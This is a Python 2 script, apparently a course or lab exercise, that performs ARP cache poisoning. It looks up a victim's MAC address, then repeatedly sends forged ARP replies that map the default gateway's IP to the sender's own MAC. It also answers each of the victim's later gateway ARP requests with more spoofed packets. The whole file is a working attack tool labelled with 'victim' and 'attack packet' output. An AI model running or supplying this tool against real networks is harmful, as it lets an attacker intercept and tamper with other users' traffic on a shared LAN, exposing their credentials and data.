import sys
import pcap
import struct
import netifaces
import ipaddress

MAC_ADDRESS_LENGHT = 6
IPV4_ADDRESS_LENGTH = 4


class Ethernet(object):
    ETHERTYPE_ARP = 0x0806
    BROADCAST = 'ffffffffffff'.decode('hex')

    def __init__(self, raw_packet=None):
        if raw_packet is None:
            self.destination_mac = None
            self.source_mac = None
            self.type = None
            self.data = None
        else:
            self.destination_mac = raw_packet[:6]
            self.source_mac = raw_packet[6:12]
            self.type = struct.unpack('!H', raw_packet[12:14])
            self.data = raw_packet[14:]

    def header_as_bytes(self):
        return ''.join((
            self.destination_mac,
            self.source_mac,
            struct.pack('!H', self.type)
        ))


class ARP(object):
    HARDWARE_ETHERNET = 1
    PROTO_IPv4 = 0x0800
    OP_REQUEST = 1
    OP_REPLY = 2

    def __init__(self, raw_packet=None):
        if raw_packet is None:
            self.ethernet = Ethernet()
            self.hardware_type = None
            self.protocol_type = None
            self.hardware_size = None
            self.protocol_size = None
            self.operation = None
            self.sender_hardware_address = None
            self.sender_protocol_address = None
            self.target_hardware_address = None
            self.target_protocol_address = None
        else:
            self.ethernet = Ethernet(raw_packet)
            raw_arp = self.ethernet.data

            self.hardware_type = struct.unpack('!H', raw_arp[:2])[0]
            self.protocol_type = struct.unpack('!H', raw_arp[2:4])[0]
            self.hardware_size = struct.unpack('!B', raw_arp[4])[0]
            self.protocol_size = struct.unpack('!B', raw_arp[5])[0]
            self.operation = struct.unpack('!H', raw_arp[6:8])[0]
            self.sender_hardware_address = raw_arp[8:14]
            self.sender_protocol_address = raw_arp[14:18]
            self.target_hardware_address = raw_arp[18:24]
            self.target_protocol_address = raw_arp[24:28]

    def as_bytes(self):
        return ''.join((
            self.ethernet.header_as_bytes(),
            struct.pack('!H', self.hardware_type),
            struct.pack('!H', self.protocol_type),
            struct.pack('!B', self.hardware_size),
            struct.pack('!B', self.protocol_size),
            struct.pack('!H', self.operation),
            self.sender_hardware_address,
            self.sender_protocol_address,
            self.target_hardware_address,
            self.target_protocol_address
        ))

    def send(self, pcap_handle):
        assert isinstance(pcap_handle, pcap.pcap)
        pcap_handle.sendpacket(self.as_bytes())


def main():
    if len(sys.argv) != 2:
        print 'Usage: python send_arp.py <victim ip>'
        exit(1)
        
    device_name = pcap.lookupdev()
    addresses = netifaces.ifaddresses(device_name)

    my_mac = addresses[netifaces.AF_LINK][0]['addr']
    my_mac_bytes = my_mac.replace(':', '').decode('hex')

    my_ip = addresses[netifaces.AF_INET][0]['addr']
    my_ip_bytes = ipaddress.ip_address(my_ip.decode('ascii')).packed

    recipient_ip = netifaces.gateways()['default'][netifaces.AF_INET][0].decode('ascii')
    victim_ip = sys.argv[1].decode('ascii')
    print

    victim_ip_bytes = ipaddress.ip_address(victim_ip).packed
    recipient_ip_bytes = ipaddress.ip_address(recipient_ip).packed

    # ask victim his mac address
    asking_arp = ARP()
    asking_arp.ethernet.destination_mac = Ethernet.BROADCAST
    asking_arp.ethernet.source_mac = my_mac_bytes

    asking_arp.ethernet.type = Ethernet.ETHERTYPE_ARP
    asking_arp.hardware_type = ARP.HARDWARE_ETHERNET
    asking_arp.protocol_type = ARP.PROTO_IPv4
    asking_arp.hardware_size = MAC_ADDRESS_LENGHT
    asking_arp.protocol_size = IPV4_ADDRESS_LENGTH

    asking_arp.operation = ARP.OP_REQUEST
    asking_arp.sender_hardware_address = my_mac_bytes
    asking_arp.sender_protocol_address = my_ip_bytes
    asking_arp.target_hardware_address = '000000000000'.decode('hex')
    asking_arp.target_protocol_address = victim_ip_bytes

    pcap_handle = pcap.pcap(timeout_ms=0)
    pcap_handle.setfilter('arp')
    asking_arp.send(pcap_handle)
    print '[<+] Sent victim({0}) a ARP request'.format(victim_ip)

    # wait for victim's response
    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation != ARP.OP_REPLY:
            continue
        if arp.sender_protocol_address != victim_ip_bytes:
            continue
        victim_mac_bytes = arp.sender_hardware_address
        print "[>+] victim replied his mac is '{0}'".format(victim_mac_bytes.encode('hex'))
        break
    else:
        raise RuntimeError('Packet capture ended unexpectedly.')

    # attack packet
    spoofed_arp = ARP()
    spoofed_arp.ethernet.destination_mac = victim_mac_bytes
    spoofed_arp.ethernet.source_mac = my_mac_bytes

    spoofed_arp.ethernet.type = Ethernet.ETHERTYPE_ARP
    spoofed_arp.hardware_type = ARP.HARDWARE_ETHERNET
    spoofed_arp.protocol_type = ARP.PROTO_IPv4
    spoofed_arp.hardware_size = MAC_ADDRESS_LENGHT
    spoofed_arp.protocol_size = IPV4_ADDRESS_LENGTH

    spoofed_arp.operation = ARP.OP_REPLY
    spoofed_arp.sender_hardware_address = my_mac_bytes
    spoofed_arp.sender_protocol_address = recipient_ip_bytes
    spoofed_arp.target_hardware_address = victim_mac_bytes
    spoofed_arp.target_protocol_address = victim_ip_bytes

    # bomb initial attack packets.
    for i in xrange(20):
        spoofed_arp.send(pcap_handle)
        print '[<+] Sent victim attack packet ({0})'.format(i)

    # additionally, grab victim's ARP request and send attack packet
    pcap_handle = pcap.pcap(timeout_ms=1000)
    pcap_handle.setfilter('arp')

    for capture in pcap_handle:
        if capture is None:
            continue
        time_stamp, packet = capture
        arp = ARP(packet)
        if arp.operation != ARP.OP_REQUEST:
            continue
        if arp.sender_protocol_address != victim_ip_bytes:
            continue
        if arp.sender_hardware_address != victim_mac_bytes:
            continue
        if arp.target_protocol_address != recipient_ip_bytes:
            continue
        print "[>+] Victim sent ARP request for ip '{0}'".format(recipient_ip)
        for i in xrange(3):
            spoofed_arp.send(pcap_handle)
            print '[<+] Sent victim attack packet ({0})'.format(i)


if __name__ == '__main__':
    main()
